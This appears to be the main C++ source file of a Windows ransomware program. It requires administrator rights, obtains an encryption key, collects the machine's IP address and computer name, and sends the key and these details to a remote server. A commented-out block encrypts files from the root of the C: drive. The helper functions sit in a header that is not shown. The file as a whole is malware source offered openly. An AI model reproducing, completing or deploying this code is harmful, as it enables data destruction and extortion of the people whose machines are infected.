#include <iostream>
#include <winsock2.h>
#include "gg.h"

int main(int argc, char* argv[])
{
    std::cout << "Program started." << std::endl;

    __userDetils__ userDetails;

    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr))
    {
        std::cerr << "Failed to initialize COM library. HRESULT: " << hr << std::endl;
        return 1;
    }

    std::cout << "COM initialized successfully." << std::endl;

    bool isAdmin = IsAdministrator(hr);
    std::cout << "Admin check result: " << isAdmin << std::endl;
    if (!isAdmin)
    {
        std::cerr << "User is not an administrator." << std::endl;
        CoUninitialize();
        return 1;
    }

    std::string path = get_this_file_path();
    std::cout << "File path obtained: " << path << std::endl;
    if (path.empty())
    {
        std::cerr << "Failed to get file path." << std::endl;
        CoUninitialize();
        return 1;
    }

    int key = get_encryption_key();
    std::cout << "Encryption key obtained: " << key << std::endl;

    std::string details = conccet_ip_and_computer_name(key, &userDetails);
    std::cout << "Details obtained: " << details << std::endl;

    std::cout << "Printing structure:" << std::endl;
    printStructure(userDetails);

    std::cout << "Saving structure to file." << std::endl;
    saveStrucetInFile(userDetails);

    std::string folderPath = "C:\\";
    std::cout << "Connecting to server." << std::endl;
    SOCKET socket = connect_to_server();
    if (socket == INVALID_SOCKET)
    {
        std::cerr << "Failed to connect to server. Invalid socket." << std::endl;
        CoUninitialize();
        return 1;
    }

    std::cout << "Checking if data is already encrypted." << std::endl;
    if (alreadyEncrypted(socket, userDetails))
    {
        std::cout << "Data is already encrypted." << std::endl;
        closesocket(socket);
        WSACleanup();
        return 1;
    }

    std::cout << "Sending data to server." << std::endl;
    if (!send_data_to_server(socket, key, userDetails))
    {
        std::cerr << "Failed to send data to server." << std::endl;
        closesocket(socket);
        WSACleanup();
        return 1;
    }

    // Uncomment the following code if needed for encryption
    /*
    std::cout << "Starting file encryption process." << std::endl;
    bool success = get_file_folders(key, folderPath, "", -1);  // Mode 1 for encryption/decryption
    if (!success)
    {
        std::cerr << "Failed to encrypt files." << std::endl;
        CoUninitialize();
        return 1;
    }
    */

    std::cout << "Program completed successfully." << std::endl;

    // Clean up COM
    CoUninitialize();
    return 0;
}
